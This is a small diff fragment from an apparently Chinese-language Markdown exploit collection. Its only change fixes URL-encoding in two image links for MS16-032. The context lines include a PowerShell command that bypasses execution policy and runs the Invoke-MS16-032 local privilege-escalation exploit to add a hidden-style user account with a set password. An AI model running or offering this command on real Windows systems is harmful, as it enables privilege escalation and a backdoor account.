@@ -223,10 +223,10 @@ exp 用途: powershell本地提权
 powershell -nop -exec bypass -c "& {Import-Module 'c:\Invoke-MS16-032.ps1';Invoke-MS16-032 -Application cmd.exe -commandline '/c net user HELPS$ amin!@#45 /add'}"
 ```
 ***
-![](../img/ms16%20032 _1.jpg)  
+![](../img/ms16%20032%20_1.jpg)  
 
 ***
-![](../img/ms16%20032 _2.jpg)  
+![](../img/ms16%20032%20_2.jpg)  
 
 ***
 
